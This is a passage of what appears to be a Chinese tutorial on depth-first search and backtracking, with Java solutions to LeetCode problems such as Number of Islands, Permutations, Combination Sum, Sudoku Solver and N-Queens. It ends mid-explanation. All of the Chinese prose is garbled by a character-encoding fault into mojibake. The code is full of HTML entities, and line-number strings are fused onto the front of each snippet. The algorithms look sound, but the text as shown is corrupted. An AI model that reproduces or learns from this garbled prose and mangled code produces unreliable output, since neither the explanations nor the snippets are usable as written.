å¯¹ä¸€ä¸ªå›¾è¿›è¡Œéå†æ—¶ï¼Œèƒ½å¤Ÿéå†åˆ°çš„èŠ‚ç‚¹éƒ½æ˜¯ä»åˆå§‹èŠ‚ç‚¹å¯è¾¾çš„ï¼ŒDFS å¸¸ç”¨æ¥æ±‚è§£è¿™ç§ å¯è¾¾æ€§ é—®é¢˜ã€‚ åœ¨ç¨‹åºå®ç° DFS æ—¶éœ€è¦è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š æ ˆï¼šç”¨æ ˆæ¥ä¿å­˜å½“å‰èŠ‚ç‚¹ä¿¡æ¯ï¼Œå½“éå†æ–°èŠ‚ç‚¹è¿”å›æ—¶èƒ½å¤Ÿç»§ç»­éå†å½“å‰èŠ‚ç‚¹ã€‚å¯ä»¥ä½¿ç”¨é€’å½’æ ˆã€‚ æ ‡è®°ï¼šå’Œ BFS ä¸€æ ·åŒæ ·éœ€è¦å¯¹å·²ç»éå†è¿‡çš„èŠ‚ç‚¹è¿›è¡Œæ ‡è®°ã€‚ æŸ¥æ‰¾æœ€å¤§çš„è¿é€šé¢ç§¯ 695. Max Area of Island (Easy) 12345678[[0,0,1,0,0,0,0,1,0,0,0,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,1,1,0,1,0,0,0,0,0,0,0,0], [0,1,0,0,1,1,0,0,1,0,1,0,0], [0,1,0,0,1,1,0,0,1,1,1,0,0], [0,0,0,0,0,0,0,0,0,0,1,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,0,0,0,0,0,0,1,1,0,0,0,0]] 1234567891011121314151617181920212223242526272829private int m, n;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public int maxAreaOfIsland(int[][] grid) &#123; if (grid == null || grid.length == 0) &#123; return 0; &#125; m = grid.length; n = grid[0].length; int maxArea = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; maxArea = Math.max(maxArea, dfs(grid, i, j)); &#125; &#125; return maxArea;&#125;private int dfs(int[][] grid, int r, int c) &#123; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || grid[r][c] == 0) &#123; return 0; &#125; grid[r][c] = 0; int area = 1; for (int[] d : direction) &#123; area += dfs(grid, r + d[0], c + d[1]); &#125; return area;&#125; çŸ©é˜µä¸­çš„è¿é€šåˆ†é‡æ•°ç›® 200. Number of Islands (Medium) 1234567Input:11000110000010000011Output: 3 å¯ä»¥å°†çŸ©é˜µè¡¨ç¤ºçœ‹æˆä¸€å¼ æœ‰å‘å›¾ã€‚ 123456789101112131415161718192021222324252627282930private int m, n;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public int numIslands(char[][] grid) &#123; if (grid == null || grid.length == 0) &#123; return 0; &#125; m = grid.length; n = grid[0].length; int islandsNum = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (grid[i][j] != '0') &#123; dfs(grid, i, j); islandsNum++; &#125; &#125; &#125; return islandsNum;&#125;private void dfs(char[][] grid, int i, int j) &#123; if (i &lt; 0 || i &gt;= m || j &lt; 0 || j &gt;= n || grid[i][j] == '0') &#123; return; &#125; grid[i][j] = '0'; for (int[] d : direction) &#123; dfs(grid, i + d[0], j + d[1]); &#125;&#125; å¥½å‹å…³ç³»çš„è¿é€šåˆ†é‡æ•°ç›® 547. Friend Circles (Medium) 1234567Input:[[1,1,0], [1,1,0], [0,0,1]]Output: 2Explanation:The 0th and 1st students are direct friends, so they are in a friend circle.The 2nd student himself is in a friend circle. So return 2. å¥½å‹å…³ç³»å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªæ— å‘å›¾ï¼Œä¾‹å¦‚ç¬¬ 0 ä¸ªäººä¸ç¬¬ 1 ä¸ªäººæ˜¯å¥½å‹ï¼Œé‚£ä¹ˆ M[0][1] å’Œ M[1][0] çš„å€¼éƒ½ä¸º 1ã€‚ 1234567891011121314151617181920212223private int n;public int findCircleNum(int[][] M) &#123; n = M.length; int circleNum = 0; boolean[] hasVisited = new boolean[n]; for (int i = 0; i &lt; n; i++) &#123; if (!hasVisited[i]) &#123; dfs(M, i, hasVisited); circleNum++; &#125; &#125; return circleNum;&#125;private void dfs(int[][] M, int i, boolean[] hasVisited) &#123; hasVisited[i] = true; for (int k = 0; k &lt; n; k++) &#123; if (M[i][k] == 1 &amp;&amp; !hasVisited[k]) &#123; dfs(M, k, hasVisited); &#125; &#125;&#125; å¡«å……å°é—­åŒºåŸŸ 130. Surrounded Regions (Medium) 1234567891011For example,X X X XX O O XX X O XX O X XAfter running your function, the board should be:X X X XX X X XX X X XX O X X ä½¿è¢« â€˜Xâ€™ åŒ…å›´çš„ â€˜Oâ€™ è½¬æ¢ä¸º â€˜Xâ€™ã€‚ å…ˆå¡«å……æœ€å¤–ä¾§ï¼Œå‰©ä¸‹çš„å°±æ˜¯é‡Œä¾§äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;private int m, n;public void solve(char[][] board) &#123; if (board == null || board.length == 0) &#123; return; &#125; m = board.length; n = board[0].length; for (int i = 0; i &lt; m; i++) &#123; dfs(board, i, 0); dfs(board, i, n - 1); &#125; for (int i = 0; i &lt; n; i++) &#123; dfs(board, 0, i); dfs(board, m - 1, i); &#125; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (board[i][j] == 'T') &#123; board[i][j] = 'O'; &#125; else if (board[i][j] == 'O') &#123; board[i][j] = 'X'; &#125; &#125; &#125;&#125;private void dfs(char[][] board, int r, int c) &#123; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || board[r][c] != 'O') &#123; return; &#125; board[r][c] = 'T'; for (int[] d : direction) &#123; dfs(board, r + d[0], c + d[1]); &#125;&#125; èƒ½åˆ°è¾¾çš„å¤ªå¹³æ´‹å’Œå¤§è¥¿æ´‹çš„åŒºåŸŸ 417. Pacific Atlantic Water Flow (Medium) 123456789101112Given the following 5x5 matrix: Pacific &lt;sub&gt; &lt;/sub&gt; &lt;sub&gt; &lt;/sub&gt; ~ ~ 1 2 2 3 (5) * ~ 3 2 3 (4) (4) * ~ 2 4 (5) 3 1 * ~ (6) (7) 1 4 5 * ~ (5) 1 1 2 4 * * * * * * AtlanticReturn:[[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]] (positions with parentheses in above matrix). å·¦è¾¹å’Œä¸Šè¾¹æ˜¯å¤ªå¹³æ´‹ï¼Œå³è¾¹å’Œä¸‹è¾¹æ˜¯å¤§è¥¿æ´‹ï¼Œå†…éƒ¨çš„æ•°å­—ä»£è¡¨æµ·æ‹”ï¼Œæµ·æ‹”é«˜çš„åœ°æ–¹çš„æ°´èƒ½å¤Ÿæµåˆ°ä½çš„åœ°æ–¹ï¼Œæ±‚è§£æ°´èƒ½å¤Ÿæµåˆ°å¤ªå¹³æ´‹å’Œå¤§è¥¿æ´‹çš„æ‰€æœ‰ä½ç½®ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253private int m, n;private int[][] matrix;private int[][] direction = &#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125;&#125;;public List&lt;int[]&gt; pacificAtlantic(int[][] matrix) &#123; List&lt;int[]&gt; ret = new ArrayList&lt;&gt;(); if (matrix == null || matrix.length == 0) &#123; return ret; &#125; m = matrix.length; n = matrix[0].length; this.matrix = matrix; boolean[][] canReachP = new boolean[m][n]; boolean[][] canReachA = new boolean[m][n]; for (int i = 0; i &lt; m; i++) &#123; dfs(i, 0, canReachP); dfs(i, n - 1, canReachA); &#125; for (int i = 0; i &lt; n; i++) &#123; dfs(0, i, canReachP); dfs(m - 1, i, canReachA); &#125; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (canReachP[i][j] &amp;&amp; canReachA[i][j]) &#123; ret.add(new int[]&#123;i, j&#125;); &#125; &#125; &#125; return ret;&#125;private void dfs(int r, int c, boolean[][] canReach) &#123; if (canReach[r][c]) &#123; return; &#125; canReach[r][c] = true; for (int[] d : direction) &#123; int nextR = d[0] + r; int nextC = d[1] + c; if (nextR &lt; 0 || nextR &gt;= m || nextC &lt; 0 || nextC &gt;= n || matrix[r][c] &gt; matrix[nextR][nextC]) &#123; continue; &#125; dfs(nextR, nextC, canReach); &#125;&#125; BacktrackingBacktrackingï¼ˆå›æº¯ï¼‰å±äº DFSã€‚ æ™®é€š DFS ä¸»è¦ç”¨åœ¨ å¯è¾¾æ€§é—®é¢˜ ï¼Œè¿™ç§é—®é¢˜åªéœ€è¦æ‰§è¡Œåˆ°ç‰¹ç‚¹çš„ä½ç½®ç„¶åè¿”å›å³å¯ã€‚ è€Œ Backtracking ä¸»è¦ç”¨äºæ±‚è§£ æ’åˆ—ç»„åˆ é—®é¢˜ï¼Œä¾‹å¦‚æœ‰ { â€˜aâ€™,â€™bâ€™,â€™câ€™ } ä¸‰ä¸ªå­—ç¬¦ï¼Œæ±‚è§£æ‰€æœ‰ç”±è¿™ä¸‰ä¸ªå­—ç¬¦æ’åˆ—å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œè¿™ç§é—®é¢˜åœ¨æ‰§è¡Œåˆ°ç‰¹å®šçš„ä½ç½®è¿”å›ä¹‹åè¿˜ä¼šç»§ç»­æ‰§è¡Œæ±‚è§£è¿‡ç¨‹ã€‚ å› ä¸º Backtracking ä¸æ˜¯ç«‹å³å°±è¿”å›ï¼Œè€Œè¦ç»§ç»­æ±‚è§£ï¼Œå› æ­¤åœ¨ç¨‹åºå®ç°æ—¶ï¼Œéœ€è¦æ³¨æ„å¯¹å…ƒç´ çš„æ ‡è®°é—®é¢˜ï¼š åœ¨è®¿é—®ä¸€ä¸ªæ–°å…ƒç´ è¿›å…¥æ–°çš„é€’å½’è°ƒç”¨æ—¶ï¼Œéœ€è¦å°†æ–°å…ƒç´ æ ‡è®°ä¸ºå·²ç»è®¿é—®ï¼Œè¿™æ ·æ‰èƒ½åœ¨ç»§ç»­é€’å½’è°ƒç”¨æ—¶ä¸ç”¨é‡å¤è®¿é—®è¯¥å…ƒç´ ï¼› ä½†æ˜¯åœ¨é€’å½’è¿”å›æ—¶ï¼Œéœ€è¦å°†å…ƒç´ æ ‡è®°ä¸ºæœªè®¿é—®ï¼Œå› ä¸ºåªéœ€è¦ä¿è¯åœ¨ä¸€ä¸ªé€’å½’é“¾ä¸­ä¸åŒæ—¶è®¿é—®ä¸€ä¸ªå…ƒç´ ï¼Œå¯ä»¥è®¿é—®å·²ç»è®¿é—®è¿‡ä½†æ˜¯ä¸åœ¨å½“å‰é€’å½’é“¾ä¸­çš„å…ƒç´ ã€‚ æ•°å­—é”®ç›˜ç»„åˆ 17. Letter Combinations of a Phone Number (Medium) 12Input:Digit string "23"Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"]. 12345678910111213141516171819202122232425private static final String[] KEYS = &#123;"", "", "abc", "def", "ghi", "jkl", "mno", "pqrs", "tuv", "wxyz"&#125;;public List&lt;String&gt; letterCombinations(String digits) &#123; List&lt;String&gt; combinations = new ArrayList&lt;&gt;(); if (digits == null || digits.length() == 0) &#123; return combinations; &#125; doCombination(new StringBuilder(), combinations, digits); return combinations;&#125;private void doCombination(StringBuilder prefix, List&lt;String&gt; combinations, final String digits) &#123; if (prefix.length() == digits.length()) &#123; combinations.add(prefix.toString()); return; &#125; int curDigits = digits.charAt(prefix.length()) - '0'; String letters = KEYS[curDigits]; for (char c : letters.toCharArray()) &#123; prefix.append(c); // æ·»åŠ  doCombination(prefix, combinations, digits); prefix.deleteCharAt(prefix.length() - 1); // åˆ é™¤ &#125;&#125; IP åœ°å€åˆ’åˆ† 93. Restore IP Addresses(Medium) 12Given "25525511135",return ["255.255.11.135", "255.255.111.35"]. 1234567891011121314151617181920212223242526272829public List&lt;String&gt; restoreIpAddresses(String s) &#123; List&lt;String&gt; addresses = new ArrayList&lt;&gt;(); StringBuilder tempAddress = new StringBuilder(); doRestore(0, tempAddress, addresses, s); return addresses;&#125;private void doRestore(int k, StringBuilder tempAddress, List&lt;String&gt; addresses, String s) &#123; if (k == 4 || s.length() == 0) &#123; if (k == 4 &amp;&amp; s.length() == 0) &#123; addresses.add(tempAddress.toString()); &#125; return; &#125; for (int i = 0; i &lt; s.length() &amp;&amp; i &lt;= 2; i++) &#123; if (i != 0 &amp;&amp; s.charAt(0) == '0') &#123; break; &#125; String part = s.substring(0, i + 1); if (Integer.valueOf(part) &lt;= 255) &#123; if (tempAddress.length() != 0) &#123; part = "." + part; &#125; tempAddress.append(part); doRestore(k + 1, tempAddress, addresses, s.substring(i + 1)); tempAddress.delete(tempAddress.length() - part.length(), tempAddress.length()); &#125; &#125;&#125; åœ¨çŸ©é˜µä¸­å¯»æ‰¾å­—ç¬¦ä¸² 79. Word Search (Medium) 12345678910For example,Given board =[ ['A','B','C','E'], ['S','F','C','S'], ['A','D','E','E']]word = "ABCCED", -&gt; returns true,word = "SEE", -&gt; returns true,word = "ABCB", -&gt; returns false. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private final static int[][] direction = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;;private int m;private int n;public boolean exist(char[][] board, String word) &#123; if (word == null || word.length() == 0) &#123; return true; &#125; if (board == null || board.length == 0 || board[0].length == 0) &#123; return false; &#125; m = board.length; n = board[0].length; boolean[][] hasVisited = new boolean[m][n]; for (int r = 0; r &lt; m; r++) &#123; for (int c = 0; c &lt; n; c++) &#123; if (backtracking(0, r, c, hasVisited, board, word)) &#123; return true; &#125; &#125; &#125; return false;&#125;private boolean backtracking(int curLen, int r, int c, boolean[][] visited, final char[][] board, final String word) &#123; if (curLen == word.length()) &#123; return true; &#125; if (r &lt; 0 || r &gt;= m || c &lt; 0 || c &gt;= n || board[r][c] != word.charAt(curLen) || visited[r][c]) &#123; return false; &#125; visited[r][c] = true; for (int[] d : direction) &#123; if (backtracking(curLen + 1, r + d[0], c + d[1], visited, board, word)) &#123; return true; &#125; &#125; visited[r][c] = false; return false;&#125; è¾“å‡ºäºŒå‰æ ‘ä¸­æ‰€æœ‰ä»æ ¹åˆ°å¶å­çš„è·¯å¾„ 257. Binary Tree Paths (Easy) 12345 1 / \2 3 \ 5 1["1-&gt;2-&gt;5", "1-&gt;3"] 123456789101112131415161718192021222324252627282930313233343536373839public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; List&lt;String&gt; paths = new ArrayList&lt;&gt;(); if (root == null) &#123; return paths; &#125; List&lt;Integer&gt; values = new ArrayList&lt;&gt;(); backtracking(root, values, paths); return paths;&#125;private void backtracking(TreeNode node, List&lt;Integer&gt; values, List&lt;String&gt; paths) &#123; if (node == null) &#123; return; &#125; values.add(node.val); if (isLeaf(node)) &#123; paths.add(buildPath(values)); &#125; else &#123; backtracking(node.left, values, paths); backtracking(node.right, values, paths); &#125; values.remove(values.size() - 1);&#125;private boolean isLeaf(TreeNode node) &#123; return node.left == null &amp;&amp; node.right == null;&#125;private String buildPath(List&lt;Integer&gt; values) &#123; StringBuilder str = new StringBuilder(); for (int i = 0; i &lt; values.size(); i++) &#123; str.append(values.get(i)); if (i != values.size() - 1) &#123; str.append("-&gt;"); &#125; &#125; return str.toString();&#125; æ’åˆ— 46. Permutations (Medium) 123456789[1,2,3] have the following permutations:[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]] 123456789101112131415161718192021222324public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;(); List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;(); boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;&#125;private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) &#123; if (permuteList.size() == nums.length) &#123; permutes.add(new ArrayList&lt;&gt;(permuteList)); // é‡æ–°æ„é€ ä¸€ä¸ª List return; &#125; for (int i = 0; i &lt; visited.length; i++) &#123; if (visited[i]) &#123; continue; &#125; visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; &#125;&#125; å«æœ‰ç›¸åŒå…ƒç´ æ±‚æ’åˆ— 47. Permutations II (Medium) 12[1,1,2] have the following unique permutations:[[1,1,2], [1,2,1], [2,1,1]] æ•°ç»„å…ƒç´ å¯èƒ½å«æœ‰ç›¸åŒçš„å…ƒç´ ï¼Œè¿›è¡Œæ’åˆ—æ—¶å°±æœ‰å¯èƒ½å‡ºç°é‡å¤çš„æ’åˆ—ï¼Œè¦æ±‚é‡å¤çš„æ’åˆ—åªè¿”å›ä¸€ä¸ªã€‚ åœ¨å®ç°ä¸Šï¼Œå’Œ Permutations ä¸åŒçš„æ˜¯è¦å…ˆæ’åºï¼Œç„¶ååœ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œåˆ¤æ–­è¿™ä¸ªå…ƒç´ æ˜¯å¦ç­‰äºå‰ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœç­‰äºï¼Œå¹¶ä¸”å‰ä¸€ä¸ªå…ƒç´ è¿˜æœªè®¿é—®ï¼Œé‚£ä¹ˆå°±è·³è¿‡è¿™ä¸ªå…ƒç´ ã€‚ 1234567891011121314151617181920212223242526272829public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; permutes = new ArrayList&lt;&gt;(); List&lt;Integer&gt; permuteList = new ArrayList&lt;&gt;(); Arrays.sort(nums); // æ’åº boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;&#125;private void backtracking(List&lt;Integer&gt; permuteList, List&lt;List&lt;Integer&gt;&gt; permutes, boolean[] visited, final int[] nums) &#123; if (permuteList.size() == nums.length) &#123; permutes.add(new ArrayList&lt;&gt;(permuteList)); return; &#125; for (int i = 0; i &lt; visited.length; i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !visited[i - 1]) &#123; continue; // é˜²æ­¢é‡å¤ &#125; if (visited[i])&#123; continue; &#125; visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; &#125;&#125; ç»„åˆ 77. Combinations (Medium) 123456789If n = 4 and k = 2, a solution is:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],] 123456789101112131415161718public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); List&lt;Integer&gt; combineList = new ArrayList&lt;&gt;(); backtracking(combineList, combinations, 1, k, n); return combinations;&#125;private void backtracking(List&lt;Integer&gt; combineList, List&lt;List&lt;Integer&gt;&gt; combinations, int start, int k, final int n) &#123; if (k == 0) &#123; combinations.add(new ArrayList&lt;&gt;(combineList)); return; &#125; for (int i = start; i &lt;= n - k + 1; i++) &#123; // å‰ªæ combineList.add(i); backtracking(combineList, combinations, i + 1, k - 1, n); combineList.remove(combineList.size() - 1); &#125;&#125; ç»„åˆæ±‚å’Œ 39. Combination Sum (Medium) 123given candidate set [2, 3, 6, 7] and target 7,A solution set is:[[7],[2, 2, 3]] 123456789101112131415161718192021public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); backtracking(new ArrayList&lt;&gt;(), combinations, 0, target, candidates); return combinations;&#125;private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations, int start, int target, final int[] candidates) &#123; if (target == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; for (int i = start; i &lt; candidates.length; i++) &#123; if (candidates[i] &lt;= target) &#123; tempCombination.add(candidates[i]); backtracking(tempCombination, combinations, i, target - candidates[i], candidates); tempCombination.remove(tempCombination.size() - 1); &#125; &#125;&#125; å«æœ‰ç›¸åŒå…ƒç´ çš„æ±‚ç»„åˆæ±‚å’Œ 40. Combination Sum II (Medium) 12345678For example, given candidate set [10, 1, 2, 7, 6, 1, 5] and target 8,A solution set is:[ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6]] 123456789101112131415161718192021222324252627public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); Arrays.sort(candidates); backtracking(new ArrayList&lt;&gt;(), combinations, new boolean[candidates.length], 0, target, candidates); return combinations;&#125;private void backtracking(List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations, boolean[] hasVisited, int start, int target, final int[] candidates) &#123; if (target == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; for (int i = start; i &lt; candidates.length; i++) &#123; if (i != 0 &amp;&amp; candidates[i] == candidates[i - 1] &amp;&amp; !hasVisited[i - 1]) &#123; continue; &#125; if (candidates[i] &lt;= target) &#123; tempCombination.add(candidates[i]); hasVisited[i] = true; backtracking(tempCombination, combinations, hasVisited, i + 1, target - candidates[i], candidates); hasVisited[i] = false; tempCombination.remove(tempCombination.size() - 1); &#125; &#125;&#125; 1-9 æ•°å­—çš„ç»„åˆæ±‚å’Œ 216. Combination Sum III (Medium) 12345Input: k = 3, n = 9Output:[[1,2,6], [1,3,5], [2,3,4]] ä» 1-9 æ•°å­—ä¸­é€‰å‡º k ä¸ªæ•°ä¸é‡å¤çš„æ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œä¸º nã€‚ 1234567891011121314151617181920212223public List&lt;List&lt;Integer&gt;&gt; combinationSum3(int k, int n) &#123; List&lt;List&lt;Integer&gt;&gt; combinations = new ArrayList&lt;&gt;(); List&lt;Integer&gt; path = new ArrayList&lt;&gt;(); backtracking(k, n, 1, path, combinations); return combinations;&#125;private void backtracking(int k, int n, int start, List&lt;Integer&gt; tempCombination, List&lt;List&lt;Integer&gt;&gt; combinations) &#123; if (k == 0 &amp;&amp; n == 0) &#123; combinations.add(new ArrayList&lt;&gt;(tempCombination)); return; &#125; if (k == 0 || n == 0) &#123; return; &#125; for (int i = start; i &lt;= 9; i++) &#123; tempCombination.add(i); backtracking(k - 1, n - i, i + 1, tempCombination, combinations); tempCombination.remove(tempCombination.size() - 1); &#125;&#125; å­é›† 78. Subsets (Medium) æ‰¾å‡ºé›†åˆçš„æ‰€æœ‰å­é›†ï¼Œå­é›†ä¸èƒ½é‡å¤ï¼Œ[1, 2] å’Œ [2, 1] è¿™ç§å­é›†ç®—é‡å¤ 12345678910111213141516171819202122public List&lt;List&lt;Integer&gt;&gt; subsets(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;(); List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;(); for (int size = 0; size &lt;= nums.length; size++) &#123; backtracking(0, tempSubset, subsets, size, nums); // ä¸åŒçš„å­é›†å¤§å° &#125; return subsets;&#125;private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets, final int size, final int[] nums) &#123; if (tempSubset.size() == size) &#123; subsets.add(new ArrayList&lt;&gt;(tempSubset)); return; &#125; for (int i = start; i &lt; nums.length; i++) &#123; tempSubset.add(nums[i]); backtracking(i + 1, tempSubset, subsets, size, nums); tempSubset.remove(tempSubset.size() - 1); &#125;&#125; å«æœ‰ç›¸åŒå…ƒç´ æ±‚å­é›† 90. Subsets II (Medium) 1234567891011For example,If nums = [1,2,2], a solution is:[ [2], [1], [1,2,2], [2,2], [1,2], []] 1234567891011121314151617181920212223242526272829public List&lt;List&lt;Integer&gt;&gt; subsetsWithDup(int[] nums) &#123; Arrays.sort(nums); List&lt;List&lt;Integer&gt;&gt; subsets = new ArrayList&lt;&gt;(); List&lt;Integer&gt; tempSubset = new ArrayList&lt;&gt;(); boolean[] hasVisited = new boolean[nums.length]; for (int size = 0; size &lt;= nums.length; size++) &#123; backtracking(0, tempSubset, subsets, hasVisited, size, nums); // ä¸åŒçš„å­é›†å¤§å° &#125; return subsets;&#125;private void backtracking(int start, List&lt;Integer&gt; tempSubset, List&lt;List&lt;Integer&gt;&gt; subsets, boolean[] hasVisited, final int size, final int[] nums) &#123; if (tempSubset.size() == size) &#123; subsets.add(new ArrayList&lt;&gt;(tempSubset)); return; &#125; for (int i = start; i &lt; nums.length; i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !hasVisited[i - 1]) &#123; continue; &#125; tempSubset.add(nums[i]); hasVisited[i] = true; backtracking(i + 1, tempSubset, subsets, hasVisited, size, nums); hasVisited[i] = false; tempSubset.remove(tempSubset.size() - 1); &#125;&#125; åˆ†å‰²å­—ç¬¦ä¸²ä½¿å¾—æ¯ä¸ªéƒ¨åˆ†éƒ½æ˜¯å›æ–‡æ•° 131. Palindrome Partitioning (Medium) 1234567For example, given s = "aab",Return[ ["aa","b"], ["a","a","b"]] 1234567891011121314151617181920212223242526272829public List&lt;List&lt;String&gt;&gt; partition(String s) &#123; List&lt;List&lt;String&gt;&gt; partitions = new ArrayList&lt;&gt;(); List&lt;String&gt; tempPartition = new ArrayList&lt;&gt;(); doPartition(s, partitions, tempPartition); return partitions;&#125;private void doPartition(String s, List&lt;List&lt;String&gt;&gt; partitions, List&lt;String&gt; tempPartition) &#123; if (s.length() == 0) &#123; partitions.add(new ArrayList&lt;&gt;(tempPartition)); return; &#125; for (int i = 0; i &lt; s.length(); i++) &#123; if (isPalindrome(s, 0, i)) &#123; tempPartition.add(s.substring(0, i + 1)); doPartition(s.substring(i + 1), partitions, tempPartition); tempPartition.remove(tempPartition.size() - 1); &#125; &#125;&#125;private boolean isPalindrome(String s, int begin, int end) &#123; while (begin &lt; end) &#123; if (s.charAt(begin++) != s.charAt(end--)) &#123; return false; &#125; &#125; return true;&#125; æ•°ç‹¬ 37. Sudoku Solver (Hard) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253private boolean[][] rowsUsed = new boolean[9][10];private boolean[][] colsUsed = new boolean[9][10];private boolean[][] cubesUsed = new boolean[9][10];private char[][] board;public void solveSudoku(char[][] board) &#123; this.board = board; for (int i = 0; i &lt; 9; i++) for (int j = 0; j &lt; 9; j++) &#123; if (board[i][j] == '.') &#123; continue; &#125; int num = board[i][j] - '0'; rowsUsed[i][num] = true; colsUsed[j][num] = true; cubesUsed[cubeNum(i, j)][num] = true; &#125; for (int i = 0; i &lt; 9; i++) &#123; for (int j = 0; j &lt; 9; j++) &#123; backtracking(i, j); &#125; &#125;&#125;private boolean backtracking(int row, int col) &#123; while (row &lt; 9 &amp;&amp; board[row][col] != '.') &#123; row = col == 8 ? row + 1 : row; col = col == 8 ? 0 : col + 1; &#125; if (row == 9) &#123; return true; &#125; for (int num = 1; num &lt;= 9; num++) &#123; if (rowsUsed[row][num] || colsUsed[col][num] || cubesUsed[cubeNum(row, col)][num]) &#123; continue; &#125; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = true; board[row][col] = (char) (num + '0'); if (backtracking(row, col)) &#123; return true; &#125; board[row][col] = '.'; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = false; &#125; return false;&#125;private int cubeNum(int i, int j) &#123; int r = i / 3; int c = j / 3; return r * 3 + c;&#125; N çš‡å 51. N-Queens (Hard) åœ¨ n*n çš„çŸ©é˜µä¸­æ‘†æ”¾ n ä¸ªçš‡åï¼Œå¹¶ä¸”æ¯ä¸ªçš‡åä¸èƒ½åœ¨åŒä¸€è¡Œï¼ŒåŒä¸€åˆ—ï¼ŒåŒä¸€å¯¹è§’çº¿ä¸Šï¼Œæ±‚æ‰€æœ‰çš„ n çš‡åçš„è§£ã€‚ ä¸€è¡Œä¸€è¡Œåœ°æ‘†æ”¾ï¼Œåœ¨ç¡®å®šä¸€è¡Œä¸­çš„é‚£ä¸ªçš‡ååº”è¯¥æ‘†åœ¨å“ªä¸€åˆ—æ—¶ï¼Œéœ€è¦ç”¨ä¸‰ä¸ªæ ‡è®°æ•°ç»„æ¥ç¡®å®šæŸä¸€åˆ—æ˜¯å¦åˆæ³•ï¼Œè¿™ä¸‰ä¸ªæ ‡è®°æ•°ç»„åˆ†åˆ«ä¸ºï¼šåˆ—æ ‡è®°æ•°ç»„ã€45 åº¦å¯¹è§’çº¿æ ‡è®°æ•°ç»„å’Œ 135 åº¦å¯¹è§’çº¿æ ‡è®°æ•°ç»„ã€‚ 45 åº¦å¯¹è§’çº¿æ ‡è®°æ•°ç»„çš„ç»´åº¦ä¸º 2 * n - 1ï¼Œé€šè¿‡ä¸‹å›¾å¯ä»¥æ˜ç¡® (r, c) çš„ä½ç½®æ‰€åœ¨çš„æ•°ç»„ä¸‹æ ‡ä¸º r + cã€‚ 135 åº¦å¯¹è§’çº¿æ ‡è®°æ•°ç»„çš„ç»´åº¦ä¹Ÿæ˜¯ 2 * n - 1ï¼Œ(r, c) 